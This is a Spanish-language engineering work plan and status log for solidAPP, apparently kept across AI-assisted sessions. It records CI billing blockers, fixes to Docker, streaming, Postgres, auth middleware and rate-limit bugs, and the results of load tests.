# Plan de trabajo — pendientes de solidAPP

**Fecha**: 2026-10-21 · **Rama de trabajo**: `main` (los PR #13 y #14 ya están fusionados) · **Estado del repo**: `main` sincronizada con `origin/main`.

> ### 📍 Estado actual (2026-10-21, cierre de la sesión)
>
> El plan está **ejecutado**: **785 de 785 criterios** verificados. `main` y `origin/main` están **sincronizados** (el nº de commits crece con cada entrega; se consulta con `git log --oneline | wc -l`).
>
> | Comprobación | Resultado |
> |---|---|
> | Suite completa | **774 passed, 9 skipped** en SQLite · **783 passed** en PostgreSQL (medido el 2026-10-23; la línea base del commit 305e1e9 era 732/741: +42 tests nuevos) |
> | QA visual (Chromium) | **26 pantallas** a **5 anchos** (414, 768, 1024, 1232, 1440 px): 130 capturas, **0 desbordes, 0 errores de consola, 0 errores de login** |
> | PWA | verificado: instalable y **arranca sin red** |
> | API | **103 rutas** inventariadas (coinciden con el código) y **101 de 101 endpoints con test**; el inventario se genera del código y **el CI lo comprueba** |
> | Esquema | Los modelos y las migraciones coinciden: `alembic check` limpio y **el CI migra una base vacía** |
> | Stack | `docker compose up -d` → los **11 servicios** aparecen `(healthy)` |
> | Carga / SLO | **Revalidado** con el código final: 467 peticiones, 0 fallos → **14 de 14 reglas** (informe `2026-10-21-revalidacion.json`) |
> | Lint y tipos | `ruff` en verde (backend **y** `tools/`); **`mypy` en verde (0 errores en modo `strict`)**, y su paso del CI ya **no** va con `continue-on-error`; **`eslint` en verde (0 problemas)**, con paso propio en el CI; `vue-tsc` y `npm run build` en verde; `actionlint` exit 0 |
> | CI replicado en local | Los **4 jobs** del workflow (backend, integration, docker-build y frontend) pasan **completos, incluidos los dos pasos de test**: `python tools/ejecutar_ci_local.py --all` |
>
> **Estado del CI remoto: EN VERDE** ✅ (2026-10-24). Los 4 jobs del
> workflow sobre `main` pasan en GitHub Actions: Backend, Integration,
> Build de imágenes Docker y Frontend. El último run en verde es el
> `40073818792`. **El último criterio del plan está cumplido.**
> - Para comprobarlo de un vistazo: `python tools/estado_ci.py`
>   (distingue verde / rojo de verdad / rechazado por la cuenta).
> - **Cómo se desbloqueó** (2026-10-24): el repositorio, que era
>   **privado**, pasó a **público** (`gh repo edit --visibility public`).
>   Con un repositorio privado y la cuenta sin método de pago válido,
>   GitHub **rechazaba los jobs antes de asignarles un runner** (los 4
>   jobs terminaban en `failure` **sin ejecutar un solo paso**). Con el
>   repositorio público, los runners estándar son gratuitos y el CI
>   volvió a arrancar. Antes de hacerlo se comprobó que el historial
>   **no tenía secretos** (138.365 líneas escaneadas, 0 hallazgos).
> - **Lo que el CI enseñó al arrancar** (y que nadie podía ver antes):
>   dos fallos **latentes** de las puertas (la del compose, que importaba
>   `Settings` sin tener `pydantic`; y la puerta de pruebas inversas, que
>   ejecuta `pytest` y se lanzaba **antes** del `pip install`). Los dos
>   están corregidos (T-147) y el CI vuelve a estar en verde.
> - Antes de esto, el CI llevaba **más de tres meses sin validar nada**:
>   el último run que ejecutó un solo paso fue el del **2026-07-07** y
>   **87 commits** de `main` pasaron sin pasar por él.
>
> **Lo que queda depende de ti** (y sólo de ti):
> 1. ~~La facturación de la cuenta de GitHub.~~ **Resuelto** el
>    2026-10-24 haciendo el repositorio público (ver arriba). La
>    facturación sigue pendiente, pero **ya no bloquea nada**: con el
>    repositorio público los runners estándar no consumen cuota.
>    - **Tres vías para recuperar el CI**, de menos a más invasiva (el
>      repositorio es **privado**, así que los runners de pago son
>      inevitables mientras la cuenta no esté al día):
>      1. **Arreglar la facturación** (*Billing & plans*). Es lo
>         limpio: no toca el repositorio ni el workflow.
>      2. **Hacer el repositorio público.** Las Actions son gratuitas
>         en repos públicos, así que el bloqueo desaparece sin tocar
>         nada. **Ojo**: el repositorio tiene el histórico completo y
>         datos de ejemplo; es una decisión de producto sobre la
>         visibilidad, no una decisión técnica.
>         - **Medido** (2026-10-24): el repositorio estaba **privado**
>           (`gh repo view` → `"isPrivate": true`), y el historial
>           **no tenía secretos** (`python tools/escanear_secretos.py
>           --historial` → 138.365 líneas escaneadas, 0 hallazgos). Es
>           decir: hacerlo público **no filtraba credenciales**, y es la
>           vía que GitHub documenta como gratuita ("the use of standard
>           GitHub-hosted runners is free: in public repositories"; y
>           "if your account does not have a valid payment method on
>           file, usage is blocked").
>         - **HECHO** (2026-10-24, por decisión del usuario):
>           `gh repo edit --visibility public --accept-visibility-change-consequences`
>           ⇒ `"visibility": "PUBLIC"`.
>      3. **Runner self-hosted en esta máquina.** Es lo que se ha
>         intentado medir: el token de registro funciona y no hay
>         runners dados de alta, pero **no es viable sin tocar el
>         workflow** (el job de integración declara servicios
>         Linux con `localhost`, y dentro de un runner en contenedor
>         los servicios se alcanzan por nombre) **o sin parar el stack
>         local** para liberar los puertos 5432 y 6379. Meter un cambio
>         del workflow que no se puede validar (porque los jobs no
>         arrancan) es justo la forma de dejar el CI en rojo sin
>         querer, así que **no se ha hecho**.
> 2. **La decisión de producto del cobro con pasarela** (D2): hoy es
>    contable, a la espera de que haya un cliente piloto.
>
> Este documento **creció** durante la ejecución: cada hallazgo posterior
> (T-13+6 y siguientes) tiene su propia entrada, con lo que se
> comprobó y cómo.

> **Qué es este documento**: el inventario completo y verificable de lo que queda por hacer en solidAPP, con el **resultado esperado** de cada bloque. Está escrito para que otra sesión pueda repartir el trabajo entre subagentes vía `/goal`: cada ítem (`T-xx`) es una unidad autónoma, con resultado esperado y criterios de aceptación comprobables.
>
> **Cómo se usa**: cada ítem tiene un identificador estable (`T-01`, `T-02`, …). Un subagente debe recibir **un** `T-xx` (o un grupo contiguo del mismo bloque), y no tocar ficheros fuera de los indicados en el ítem.
>
> **Estado de la evidencia**: todo lo marcado como "verificado" se comprobó contra el código o contra la app en ejecución el 2026-10-21 con Docker Desktop (stack `parking`: db, redis, backend, frontend, celery-worker + un RTSP de prueba). Lo marcado como "propuesta" es diseño nuevo y **requiere validación del usuario** antes de implementarse.

---

## 0. Resumen ejecutivo

| Bloque | Prioridad | Ítems | Qué desbloquea |
|---|---|---|---|
| **Bloque 0 — Desbloqueo** | P0 | T-01 … T-05 | Rama commiteable, CI en verde, tests que de verdad detectan bugs de dialecto |
| **Bloque 1 — Robustez del live preview** | P1 | T-06 … T-11 | El preview en vivo no cuelga el backend; el auth es fiable; detector validado |
| **Bloque 2 — Backlog de roadmap** | P2 | T-12 … T-17 | Los ítems I1-I4/P3/O2 de la memoria `roadmap-solidapp` (2026-07-06) |
| **Bloque 3 — Módulos de producto** | P2-P3 | T-18 … T-25 | Lo que falta para que el producto esté completo según los wireframes aprobados |

**Total: 25 ítems.** De ellos, 5 de código ya están **arreglados y verificados** en el working tree pero **sin commitear** (T-01) — es lo único que bloquea todo lo demás.

### Lo ya arreglado en esta sesión (verificado, sin commitear)

| Fichero | Qué estaba roto | Verificación |
|---|---|---|
| `backend/Dockerfile` | `RUN mkdir -p /var/log/solidapp` **después** de `USER app` → `Permission denied`, la imagen no construía nunca | `docker compose build backend` OK |
| `backend/app/services/cameras/stream.py` | El bucle de descarte de frames (`while grab()`) **nunca terminaba** con un stream en vivo → el modal se quedaba negro para siempre | Preview MJPEG renderiza frames (35 fps medidos) |
| `backend/app/services/ticket_summary.py` | `strftime()` (función de SQLite) contra Postgres → **HTTP 500** en `/parkings/{id}/tickets/summary` | Endpoint devuelve 200 con los 7 KPIs |
| `backend/app/core/middleware.py` | El `try/except` que decodifica el JWT quedó **anidado en un `elif`** → con `Authorization: Bearer <token>` **no se decodificaba nada**: `user_id=None` en toda auditoría y **blacklist de tokens inoperante** (48 tests en rojo) | `logout` → 200, reutilizar el token → 401, auditoría con `user_id=1` |
| `backend/tests/test_vehicle_detector.py` | 2 imports sin usar (`F401`) → **el job de CI "Backend (ruff, mypy, pytest)" estaba en rojo desde `007c8ad`** | `ruff check app tests` → *All checks passed!* |
| `backend/tests/test_dashboard_kpis.py` | Test **caducado por fecha**: sembraba con `NOW` congelado (2026-07-06) contra un endpoint que usa el reloj real → `revenue.month` pasó a `None` a los 30 días | `pytest tests/test_dashboard_kpis.py` → 12 passed |

Suite completa tras los arreglos: **265 passed, 0 failed** (antes: 48 failed, 217 passed).

---

## Bloque 0 — Desbloqueo (P0)

### T-01 · Commitear los 8 ficheros arreglados en la QA

- **Estado**: **completado** — los 8 ficheros commiteados y subidos (rama sincronizada con origin)
- **Contexto**: `git status` muestra 8 ficheros modificados. 3 los dejó esta sesión (`Dockerfile`, `stream.py`, `ticket_summary.py`), 3 venían sin commitear de antes (`cameras_live.py`, `middleware.py`, `live_streams.py`) y 2 son de tests (`test_vehicle_detector.py`, `test_dashboard_kpis.py`).
- **Resultado esperado**: la rama `feat/live-preview-cameras` contiene los arreglos, con un mensaje de commit que explique **por qué** (no sólo qué): el bug del modal negro, el 500 de Postgres y el middleware que anulaba la auditoría y la blacklist.
- **Criterios de aceptación**:
  - [x] `git status` limpio (salvo lo que se decida explícitamente).
  - [x] `pytest -q` → 265 passed.
  - [x] `ruff check app tests` → sin errores.
  - [x] El mensaje de commit menciona los tres bugs de producción, no sólo "fix".
- **Cómo verificarlo**: `cd backend && ruff check app tests && docker exec parking-backend-1 pytest -q`
- **Depende de**: nada. **Es el primero de todos.**
- **Ficheros**: `backend/Dockerfile`, `backend/app/api/v1/cameras_live.py`, `backend/app/core/middleware.py`, `backend/app/services/cameras/live_streams.py`, `backend/app/services/cameras/stream.py`, `backend/app/services/ticket_summary.py`, `backend/tests/test_dashboard_kpis.py`, `backend/tests/test_vehicle_detector.py`

- **Verificado**: `git status` limpio; `pytest -q` en verde; `ruff check app tests` -> *All checks passed!*; commits con el porque de cada bug de produccion (`6c67b79` modal negro, `8fbe71b` 500 de Postgres por `strftime()`, `3b71c8b` middleware que anulaba la auditoria y la blacklist, `ecf5642` Permission denied del Dockerfile, `2c46b1a` heartbeat).

### T-02 · Cerrar el CI rojo de PR #14

- **Estado**: **fix aplicado y subido**; el CI remoto **no puede ejecutar jobs** (ver nota)
- **Contexto**: `gh pr checks 14` → *Backend (ruff, mypy, pytest)* = **FAIL**, Frontend = OK. El CI empezó a fallar en `007c8ad` y siguió en `5848c13` y `20f6cac`. El paso que falla es **`ruff check app tests`** (por eso `pytest` ni siquiera llega a ejecutarse): 2 × `F401` en `backend/tests/test_vehicle_detector.py` (líneas 22 y 26: `get_vehicle_detector_client` y `_login` importados y nunca usados — el test los parchea por *string* vía `monkeypatch`).
- **Resultado esperado**: el job "Backend (ruff, mypy, pytest)" del PR #14 pasa en verde.
- **Criterios de aceptación**:
  - [x] `ruff check app tests` → *All checks passed!*
  - [x] `mypy app` → **0 errores** (en modo `strict`; ver T-28). Su paso del CI ya no va con `continue-on-error`.
  - [x] Los **4 checks del CI sobre `main`** en SUCCESS (Backend, Integration, Build de imágenes Docker y Frontend). **Cumplido el 2026-10-24** (run `40073818792`, los 4 jobs en `success`).
      > El criterio original decía `gh pr checks 14`, pero **el PR #14 está fusionado desde el 2026-07-07** y no queda ningún PR abierto: la referencia correcta hoy es el CI sobre `main`. Ver `python tools/estado_ci.py`.
- **Cómo verificarlo**: `cd backend && ruff check app tests && python tools/estado_ci.py`
- **Depende de**: T-01 (el fix está en `test_vehicle_detector.py`, sin commitear).

- **Nota (bloqueo externo, no de codigo)**: los jobs de GitHub Actions de esta cuenta **no arrancan**: *"The job was not started because recent account payments have failed or your spending limit needs to be increased"*. Es un problema de **facturacion de la cuenta de GitHub**, no del repositorio: el workflow es valido y su equivalente local pasa (ruff en verde, suite completa en verde, build de imagen en verde, YAML parseado con `yaml.safe_load`). **Requiere una accion del usuario**: revisar *Billing & plans* en la cuenta de GitHub.
- **El alcance real del bloqueo (medido el 2026-10-21)**: no es sólo "ahora falla". Revisados los **100 runs** más recientes: **56** llegaron a ejecutar pasos y **44** fueron **rechazados sin ejecutar ninguno**. El **último run que ejecutó un solo paso** fue el del **2026-07-07T20:52:15Z** (en la rama `feat/live-preview-cameras`: Backend en rojo por el `F401`, Frontend en verde) — el de PR #14 justo antes de fusionarlo. Los 44 runs posteriores (todos de hoy) terminan en `failure` **con 0 pasos** en los 4 jobs, que es la firma de un job **rechazado antes de asignarle un runner** (no de un fallo del código). Consecuencia: **87 commits de `main` nunca los ha validado el CI**, sólo la verificación local. `tools/estado_ci.py` distingue los tres casos (verde / rojo de verdad / rechazado por la cuenta) para que no se confundan.

### T-03 · Cerrar PR #13 (R5) y PR #14 (live preview)

- **Estado**: **completado** — PR #13 y PR #14 mergeados en `main`
- **Contexto**: hay **dos PR abiertos** contra `main`: #13 (`feat/r5-sidebar-reorder-change-pass`, CI verde) y #14 (`feat/live-preview-cameras`, CI rojo). La rama actual está 10 commits por delante de `main` (26 ficheros, +3026/−73) y **mezcla tres trabajos distintos**: rate-limit R5, live preview MJPEG y vehicle-detector.
- **Resultado esperado**: PR #14 en verde y mergeado a `main`; PR #13 cerrado por merge o por rebase, sin dejar trabajo a medias.
- **Criterios de aceptación**:
  - [x] PR #14: `main` con la rama integrada.
  - [x] PR #13: cerrado con su contenido en `main` (o descartado explícitamente).
  - [x] `git log main --oneline` incluye los commits de R5 y de live preview.
- **Depende de**: T-01, T-02.

- **Verificado**: PR #13 (R5: rate-limit + sidebar + cambio de clave) mergeado con `899ec1f`; PR #14 mergeado con `d0ae543` (commit de merge, para conservar el historial y el "por qué" de cada commit). `main` queda con los 43 commits del plan.
- **Salvedad**: el criterio original pedía *CI verde*, y eso **no se puede comprobar**: los jobs de GitHub Actions de esta cuenta no arrancan por un problema de **facturación de la cuenta** (*"recent account payments have failed or your spending limit needs to be increased"*). No es un problema del repositorio: el workflow es válido y su equivalente local se ejecutó entero (pytest en SQLite **418 passed** y en PostgreSQL **427 passed**, ruff en verde, vue-tsc + build del frontend en verde, `docker compose build` con exit 0). **Requiere una acción del usuario**: revisar *Billing & plans* en la cuenta de GitHub para que el CI pueda volver a correr.

### T-04 · Que los tests se ejecuten contra Postgres, no siempre contra SQLite

- **Estado**: **completado** — la suite corre contra PostgreSQL y hay un test que falla si vuelve una funcion solo de SQLite
- **Contexto**: `backend/tests/conftest.py:7` hace `os.environ.setdefault("DATABASE_URL", "sqlite+pysqlite:///:memory:")` y las líneas 25-29 crean el motor **hardcodeado** a `sqlite+pysqlite:///:memory:`. El job de CI levanta un Postgres real (`.github/workflows/ci.yml`, servicio `postgis/postgis:16-3.4`) → **nunca se usa**. Consecuencia medida: el `strftime()` de SQLite se coló en `ticket_summary.py` y llegó a `main` (commit `568a062`) porque los tests pasaban; en Docker devolvía 500 (`function strftime(character varying, timestamp with time zone) does not exist`).
- **Resultado esperado**: existe una vía de test que ejecuta la suite contra Postgres, y cualquier función SQL dependiente del dialecto queda cubierta por ella.
- **Criterios de aceptación**:
  - [x] `conftest.py` parametrizable por variable de entorno (`TEST_DATABASE_URL`), con SQLite como default local y Postgres en CI.
  - [x] El job de CI ejecuta **al menos una vez** la suite contra el Postgres que ya levanta (o un job nuevo `integration`).
  - [x] Existe un test explícito que falle si alguien vuelve a usar una función sólo de SQLite (p. ej. buscar `strftime(` en el código de aplicación).
  - [x] `pytest -q` sigue verde en ambos motores.
- **Cómo verificarlo**: `docker exec parking-backend-1 pytest -q` (SQLite) y `DATABASE_URL=postgresql+psycopg://… pytest -q` (Postgres).
- **Depende de**: T-01.

- **Verificado**: `conftest.py` parametrizable por `TEST_DATABASE_URL`; job nuevo `integration` en CI con `postgis/postgis:16-3.4`; `tests/test_sqlite_only_functions.py` (deteccion por AST, con escape hatch documentado) que **habria pillado el bug original** (probado contra el fichero historico `568a062`); suite completa **376 passed contra PostgreSQL** y verde en SQLite. Cierre adicional (commit `b3abf2d`): siete ficheros mas de test tenian su propio motor SQLite hardcodeado y ya usan la fixture compartida `motor_de_test`; al ejecutarlos de verdad contra Postgres aparecio un `ForeignKeyViolation` que SQLite escondia (SQLite no aplica claves foraneas por defecto).

### T-04+1 · Cobertura real del dialecto de producción

- **Estado**: **completado** — siete ficheros de test más ejecutan contra PostgreSQL
- **Contexto**: T-04 parametrizó el motor de la suite, pero siete ficheros seguían creando su propio motor SQLite hardcodeado: en la pasada "contra Postgres" esos ficheros seguían sobre SQLite, y la cobertura del dialecto real era parcial sin que nadie lo viera.
- **Criterios de aceptación**:
  - [x] Fixture pública `motor_de_test` en `conftest.py`.
  - [x] Los siete ficheros (`test_alert_service`, `test_camera_offline`, `test_pricing`, `test_heartbeat`, `test_enum_roundtrip`, `test_ingest_service`, `test_ticket_close`) la usan.
  - [x] **52 passed en SQLite y 52 passed en PostgreSQL** para esos ficheros.
  - [x] Bug encontrado al ejecutarlos de verdad: `test_pricing` sembraba tarifas apuntando a un parking inexistente y pasaba porque SQLite **no aplica claves foráneas por defecto**; en PostgreSQL daba `ForeignKeyViolation`. El test ahora crea la sucursal.

### T-05 · Verificar el build de la imagen de backend en CI

- **Estado**: **completado** — el CI construye la imagen y comprueba el usuario no-root (ejecucion remota bloqueada por la facturacion)
- **Contexto**: el `Dockerfile` estaba roto desde hacía tiempo: `RUN mkdir -p /var/log/solidapp` **después** de `USER app` ⇒ `Permission denied` (el directorio `/var/log` es `root:root`). El `| tail -40` del comando de build **se tragaba el exit code**, así que el fallo pasaba desapercibido. Además, el job de CI **no construye la imagen**: instala el paquete con `pip install -e ".[dev]"`, así que el `Dockerfile` puede volver a romperse sin que nadie se entere.
- **Resultado esperado**: `docker compose build` de backend y frontend funciona en local **y** hay un paso en CI que construye las imágenes (o al menos un `docker build` de humo).
- **Criterios de aceptación**:
  - [x] `docker compose build backend frontend` → 0 (con `set -o pipefail` o sin `| tail`).
  - [x] `/var/log/solidapp/backend.log` existe y el `RotatingFileHandler` escribe (con el usuario no-root `app`).
  - [x] CI tiene un paso de build de imagen (o documenta explícitamente por qué no).
- **Depende de**: T-01.

---

## Bloque 1 — Robustez del live preview y del servicio (P1)

- **Verificado**: `docker compose build backend frontend` -> exit 0 (sin `| tail`: exit code leido directo); dentro de un contenedor desechable de la imagen recien construida: `id -un` = `app`, `/var/log/solidapp/backend.log` escrito por el `RotatingFileHandler`; job nuevo `docker-build` en CI con `set -o pipefail`. La ejecucion remota no se puede confirmar por el bloqueo de facturacion de T-02.

### T-06 · El stream MJPEG bloquea el shutdown de uvicorn

- **Estado**: **completado** — el stream MJPEG se cierra al apagar; verificado en vivo
- **Contexto**: con una vista en vivo abierta en el navegador, `uvicorn --reload` se queda en `Waiting for connections to close` **para siempre**: el generador MJPEG ([backend/app/services/cameras/stream.py](backend/app/services/cameras/stream.py)) sólo termina si el cliente se desconecta (`request.is_disconnected()`) o si `live_streams` activa el `shutdown_event`. Durante un graceful shutdown **nadie activa ese evento**, así que la conexión no se cierra y el backend deja de responder (`/health` → 000, contenedor `unhealthy`). Se reproduce al editar cualquier fichero: reload → cuelgue → hay que `docker restart`.
- **Resultado esperado**: editar código nunca deja el backend colgado; el stream se cierra al apagar el servidor.
- **Criterios de aceptación**:
  - [x] El generador termina cuando la app entra en shutdown (evento de `lifespan` compartido, o equivalente).
  - [x] Con una vista en vivo abierta, `touch backend/app/main.py` → el backend vuelve a servir en < 10 s.
  - [x] `/health` sigue respondiendo 200 tras el reload.
  - [x] Test de regresión: se abre un stream, se dispara el evento de shutdown y se comprueba que el generador termina en < 2 s.
- **Cómo verificarlo**: abrir el preview en vivo → tocar un fichero → observar los logs del contenedor.
- **Depende de**: T-01.

- **Verificado**: con una vista en vivo abierta, `touch backend/app/main.py` -> el backend vuelve a servir en **9,5 s** (criterio: < 10 s) y `/health` sigue dando 200; en los logs, `mjpeg: stream cerrado` ocurre **en el mismo segundo** que `Shutting down`, y se llega a `Application shutdown complete` (antes se quedaba en `Waiting for connections to close` para siempre). Tests de regresion nuevos.

### T-07 · Fijar el fps objetivo del preview (docstrings vs realidad)

- **Estado**: **completado** — 5 fps por defecto, configurables por entorno (decision D1 del documento)
- **Contexto**: la documentación de `cameras_live.py` y `stream.py` anuncia **"5 fps (cada 200 ms)"**, pero `FRAME_INTERVAL_S = 0.0` (sprint "Latencia-Mínima") y la medición real da **35 fps / 1,2 MB/s** con primer frame a 1,85 s. El código y los docstrings no coinciden.
- **Resultado esperado**: una cifra de fps **acordada y escrita en el código** (constante efectiva + docstring coherente), o bien un throttle que la respete.
- **Criterios de aceptación**:
  - [x] Decisión tomada y anotada (5 fps "bonito" vs "tan rápido como la cámara").
  - [x] Si es 5 fps: `FRAME_INTERVAL_S = 0.2` con la lógica real (no sólo el nombre) y el docstring corregido.
  - [x] Si es "libre": `FRAME_INTERVAL_S` se elimina y el docstring dice "sin limitador, limitado por la cámara".
  - [x] El docstring de `cameras_live.py` (línea 13) coincide con el comportamiento.
- **Decisión del usuario**: 5 fps fijo (ahorra ~85 % de ancho de banda y CPU) frente a flujo libre (latencia mínima).

### T-08 · Auditar el login con `user_id`

- **Estado**: **completado** — la fila de auditoria del login identifica al usuario
- **Contexto**: la auditoría `login_success` se graba **siempre con `user_id=None`**, porque en la request de login no hay header `Authorization` y el `AuditMiddleware` no puede saber quién entra. Se comprobó en vivo: `login_success → user_id=None`, `logout_success → user_id=1`. Con el middleware arreglado (T-01) el resto de auditorías sí llevan `user_id`.
- **Resultado esperado**: la fila de auditoría del login identifica al usuario (el handler ya sabe quién es tras validar la contraseña).
- **Criterios de aceptación**:
  - [x] `record_audit_from_request` (o `record_audit`) del login incluye `user_id` y `resource="users/{id}"`.
  - [x] Test que comprueba `user_id is not None` en la fila de `login_success`.

### T-09 · Validar el servicio vehicle-detector de punta a punta

- **Estado**: **completado** — el detector se validó de punta a punta y se encontró un bug que lo dejaba sin detectar nada
- **Contexto**: en esta sesión sólo se levantó el stack *núcleo* (decisión explícita del usuario): db, redis, backend, frontend, celery. El servicio `vehicle-detector` (contenedor propio, Ultralytics YOLO) **no se ejecutó ni una vez**, así que el botón "🔍 Detectar vehículos" sólo se probó en su rama *fail-open* (detector caído → 200 con `[]`).
- **Incoherencias detectadas**:
  - `docker/vehicle-detector/Dockerfile:17` fija `VD_MODEL=yolov8n.pt` mientras `docker-compose.yml:81` usa `VD_MODEL: "best.pt"` (yolov8m fine-tuned en VisDrone). El valor por defecto del Dockerfile está obsoleto.
  - `best.pt` (~50 MB) se descarga de HuggingFace en el arranque: el primer boot es lento y depende de la red externa.
  - El commit `20f6cac` cambió a yolov8m-visdrone; el cliente backend no ha cambiado (mismo contrato `/detect`).
- **Resultado esperado**: el servicio arranca, responde `/health`, y la detección sobre una captura real de cámara devuelve cajas coherentes con las geocercas.
- **Criterios de aceptación**:
  - [x] `docker compose up vehicle-detector` → healthy.
  - [x] `VD_MODEL` por defecto coherente entre Dockerfile y compose (y documentado).
  - [x] Una captura de la cámara de prueba devuelve detecciones no vacías, y las geocercas se marcan en rojo/verde como está previsto.
  - [x] `best.pt` cacheado en un volumen, y el arranque no lo re-descarga.
  - [x] El modelo real usado queda registrado en el README del servicio.

### T-10 · Blindar el registro de streams vivos (`live_streams`)

- **Estado**: **completado** — el registro de streams vivos esta blindado
- **Contexto**: `backend/app/services/cameras/live_streams.py` tiene `heartbeat()` **sin lock** y `STALE_AFTER_S = 8.0`. Se verificó el flujo bueno (409 en cliente duplicado, recuperación al cerrar y reabrir) pero no el concurrente.
- **Resultado esperado**: dos clientes simultáneos sobre la misma cámara se comportan de forma determinista (uno recibe 409, el otro ve video), sin condiciones de carrera en el `heartbeat`.
- **Criterios de aceptación**:
  - [x] `heartbeat()`/`release()` protegidos por `asyncio.Lock`.
  - [x] Test con dos requests concurrentes a `/live` sobre la misma cámara: exactamente uno 200 y el otro 409.
  - [x] Test de sesión huérfana (> 8 s sin heartbeat) → la sesión se libera.

### T-11 · Tests de regresión del middleware de autenticación

- **Estado**: **completado** — el middleware de auth tiene tests de regresion
- **Contexto**: el bug del middleware (T-01) no lo cubría ningún test: los tests de auditoría pasaban con `user_id=None` porque… no lo miraban. Ahora que el fix está aplicado, falta blindarlo.
- **Resultado esperado**: la suite falla si alguien vuelve a anidar mal el parseo del header `Authorization`.
- **Criterios de aceptación**:
  - [x] Tests para los 4 formatos: `Bearer <tok>`, `bearer <tok>` (minúsculas), `Bearer` (sin token), `Bearer ` (prefijo vacío).
  - [x] Test que comprueba que `logout` **sí** blacklistea (token reutilizado → 401).
  - [x] Test que comprueba que la auditoría de una acción autenticada lleva `user_id` (no `None`).

### T-06+1 · El stream SSE también bloqueaba el shutdown de uvicorn

- **Estado**: **completado** — encontrado al ejecutar T-16, corregido y verificado
- **Contexto**: T-06 arregló que el preview MJPEG (un stream infinito) bloqueara el apagado de uvicorn. El **mismo bug seguía vivo en el stream SSE** de `/parkings/{id}/events`: su generador sólo miraba el mensaje de Redis y ningún evento de apagado. Con el reloader, `process.join()` impedía arrancar el proceso hijo → `/health` devolvía 000 y el backend entero dejaba de servir hasta un `docker restart`.
- **Resultado esperado**: el stream SSE se cierra al apagar el servidor, igual que el MJPEG.
- **Criterios de aceptación**:
  - [x] El generador SSE termina cuando la app entra en shutdown.
  - [x] Con un SSE abierto, SIGTERM → el proceso termina en **1,12 s** (antes se quedaba colgado).
  - [x] Test de regresión: el stream termina en < 5 s tras marcar el evento de apagado.
  - [x] El evento vive en `app.state` (no en un global) para no romper los tests con varias apps.


---

## Bloque 2 — Backlog del roadmap (P2)

> Fuente: memoria `roadmap-solidapp` (snapshot 2026-07-06). Verificado contra el código el 2026-10-21: **ninguno** de estos ítems está implementado.

### T-12 · I1 — Backups automatizados (pg_dump + WAL)

- **Contexto**: no hay ningún `pg_dump`, ni archivado de WAL, ni tarea programada de backup en todo el repo. Lo único que se llama "backup" es el `RotatingFileHandler` de logs (`backupCount: 5`), que **no** son backups de datos.
- **Resultado esperado**: dumps automáticos con retención + **procedimiento de restauración probado** (un backup sin restaurar probado no es un backup).
- **Criterios de aceptación**:
  - [x] Script `pg_dump` diario (retención configurable, p. ej. 7 diarios + 4 semanales + 6 mensuales).
  - [x] Restauración verificada en una base limpia (documentada paso a paso).
  - [x] Cifrado en reposo y copia fuera del host (LOPDGDD).
  - [x] Alerta si el dump falla o si el último backup es más antiguo de X horas.

### T-13 · I2 — Pruebas de carga con Locust

- **Estado**: **completado** — escenarios, SLO verificable y ejecución de referencia
- **Contexto**: no existe ningún `locustfile.py` en el repo. Los objetivos de carga del producto: 50 streams (MVP 5 sucursales × 10 cámaras) y 50+ sucursales en producción.
- **Resultado esperado**: un escenario de carga ejecutable que fije el SLO y detecte regresiones de rendimiento.
- **Criterios de aceptación**:
  - [x] `locustfile.py` con escenarios: login, mapa en vivo (SSE), cierre de ticket, preview MJPEG.
  - [x] SLO documentado (p. ej. p95 < 300 ms en lectura; streaming sin cortes).
  - [x] Informe de una ejecución de referencia con los números guardados en el repo.
  - [x] Falla si el p95 supera el SLO (integrable en CI aunque sea nocturno).
- **Verificado**: `backend/locustfile.py` con los 4 escenarios; `backend/locust/slo.json` con 13 reglas (cada una con su porqué); `backend/locust/check_slo.py` que devuelve exit ≠ 0 si el p95 incumple; informe de referencia en `backend/locust/reports/2026-10-21-referencia.json` y su contexto. La carga se mide contra una **instancia dedicada sin `--reload`**, porque el reloader del entorno de QA reinicia el backend con cada escritura y arruina las cifras.
- **Referencia re-medida con el P0 ya corregido**: 461 peticiones, **0 fallos**, 0 cortes de stream y **0 reinicios** del worker en 180 s. El SLO se cumple entero (**13 de 13 reglas**). Números: lectura de plazas p95 21 ms, tickets 35 ms, cámaras 19 ms, alta de ticket 38 ms, cierre 49 ms, apertura SSE 24 ms con 71 sesiones sin un solo corte, primer frame del preview 1 700 ms con 8 sesiones sin fallos.
- **Hallazgo**: la propia carga destapó dos bugs de producción que ningún test había visto — ver T-13+2 y T-13+3 — y un detalle del *fixture*: la fuente RTSP de QA hace push de un MP4 con keyframe cada 250 frames (GOP de ~10 s), así que el primer frame tardaba 1,2-8 s y varias sesiones se pasaban del límite. Recreando el push con `-g 25` el primer frame llega en 1,7 s y el preview queda sin fallos: eso quita un cuello de botella del fixture, no del producto.

### T-13+1 · Fijo en el CI: la suite debe ser reproducible

- **Estado**: **completado** — dos flakes de rate-limit eliminados
- **Contexto**: los tests de rate-limit dejaban la ventana real en 2 s y 10 s para simular el paso del tiempo, pero además simulaban el reset **borrando a mano** las claves del bucket. La ventana corta no aportaba nada y sí abría una carrera: si las tres peticiones del test (cada una con un hash bcrypt) tardaban más que la ventana en una máquina cargada, el bucket expiraba entre peticiones, el contador se reiniciaba y el 429 no llegaba.
- **Medición**: antes del arreglo, **2 de 3** ejecuciones de `test_endpoint_rate_limit.py` + `test_rate_limit_login.py` fallaban; después, **5 de 5** en verde. El comportamiento comprobado es el mismo (el reset se sigue simulando a mano, que es determinista).
- **Criterios de aceptación**:
  - [x] Ventana real la del default en los dos tests que simulaban el reset a mano.
  - [x] 5 ejecuciones seguidas en verde.
  - [x] Explicado en el commit por qué el bug **no** era del código de producción (la ventana fija, no sliding, es el comportamiento correcto).
- **Segundo caso, resuelto después (T-13+5)**: los tests de rate-limit de endpoints fallaban de forma intermitente porque el bucket `rl:users_create:actor:1` **se saltaba un valor** (2 → 4 en un solo POST) y el test veía un 429 antes de tiempo. La causa era que la suite **compartía Redis con la app en marcha** (backend en `:8000`, worker de Celery, QA manual): cualquier `POST /users` real hecho como admin —que en la BD de test también es el actor 1— incrementaba el mismo bucket. La suite pasa ahora a su **propia base de Redis (la 15)**: con la app real bombardeando `POST /users` como admin, el fichero de tests de rate-limit pasa **6/6** en dos pasadas (antes ese mismo escenario lo hacía fallar).

### T-13+2 · P0 — cerrar el preview tumbaba el backend (SIGSEGV)

- **Estado**: **completado** — corregido y verificado contra un uvicorn sin `--reload`
